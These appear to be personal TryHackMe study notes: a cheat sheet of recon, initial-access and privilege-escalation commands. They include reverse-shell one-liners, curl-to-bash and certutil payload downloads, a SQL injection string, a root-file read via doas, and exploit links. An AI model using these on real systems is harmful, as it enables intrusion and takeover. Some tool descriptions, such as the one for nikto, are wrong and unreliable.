
# Tryhackme Experience
- Index
  - [Reconnaissance](https://github.com/sumo2001/Prep-Notes/tree/main/tryhackme#reconnaissance)
  - [Initial Access](https://github.com/sumo2001/Prep-Notes/tree/main/tryhackme#initial-access)
  - [Interesting files and paths](https://github.com/sumo2001/Prep-Notes/tree/main/tryhackme#interesting-files-and-paths)
  - [Esclation and Tweaks](https://github.com/sumo2001/Prep-Notes/tree/main/tryhackme#esclation-and-tweaks)


### Reconnaissance
- Nmap -sC -sV -v target   
  - sV tries to find out which services are running on the target
  - Pn disables the ping command and only scans ports.
  - sC is short form for script scan, based on services availble, it uses sripts to scan more
  - T<0-5>: Set timing template (higher is faster)
  - A Enable OS detection, version detection, script scanning, and traceroute
- gobuster dir -u http://10.10.164.212/ -w /usr/share/wordlists/dirb/common.txt
  - dir fuzzer 
- nikto -h target
  - tool for enumerating information from Windows and Samba systems
- enum4linux target
  - tool for enumerating information from Windows and Samba systems 
- smbmap -H target 
  - SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents etc.
- smbclient //target/share
  - Mostly used in null sessions kinda samba exploitable directories
- rustscan -a target
  - The modern NMAp scanner  
### Initial Access
- Searchsploit nagios
  - searchsploit -m php/webapps/blah.txt  -> convert to py shell and read the comments/usage details in the the following code and input accordingly
 - python3 -m http.server 8080
  - Opens up a dedicated python server over the internet to serve files in that directory
  - http://10.9.2.90:8080/shell.sh | bash
 - nc -nlvp 1234
   - Opens up a netcat shell on attacker box for incoming connections 
 -  python -c 'import pty; pty.spawn("/bin/bash")'  
   - Upgrade from a dump shell to  bash shell
 - powershell.exe Invoke-WebRequest -Uri https://10.10.10.10/shell.exe -OutFile ./shell.exe && .\shell.exe
   - powershell.exe — this is a shell in windows (other than cmd.exe) it is object oriented and it is the blue teams best friend and a hackers favorite mistress
   - Invoke-WebRequest — powershell module similar to curl
   - Uri — the target URI
   - OutFile — what the file downloaded will be called
   - .\shell.exe — execute the shell.exe in the current working directory
   - Get-Content user.txt
 - certutil.exe -urlcache -split -f http://10.17.8.104:8080/mysqld_evil.exe mysqld.exe
   - To download a payload from a remote server 
- 1' or '1'='1';-- -
  - SQL Injection Payloads 
  - sqlmap -r login.req --level 3 --risk 3
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f
  - If we have a ‘PHP system’ remote code exec on the system, we will spawn a proper rev shell using nc

- /bin/bash -i >& /dev/tcp/10.2.96.144/4443 0>&1
  - Load this babe into a .sh file used during cronjob kinda exploits 
  - ?cmd=curl+http://10.2.96.144:8000/rev.sh+|+bash
  - Downloadas and executes file
  - [Pentest Monkey Reverse PHP file](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

### Interesting files and paths
- cd /var/www/html/wordpress/wp-config.php
- doas.conf
  - Check whether SSL is permitted to run as root! [permit nopass plot_admin as root cmd openssl
]
  -  doas openssl enc -in "/root/root.txt"  
- 

### Esclation and tweaks
- su user
- sudo -l
- https://gtfobins.github.io/
  - Limuzzzzzz
- https://lolbas-project.github.io/  
  - Windows 
- find / -type f -perm -u=s 2>/dev/null
- getcap -r / 2>/dev/null 
- https://github.com/ly4k/PwnKit/blob/main/PwnKit.c
- curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh



### References and boxes completed
1. https://tryhackme.com/room/techsupp0rt1
2. https://tryhackme.com/room/flatline
3. https://tryhackme.com/room/plottedtms
4. https://tryhackme.com/room/gallery666
5. 
    
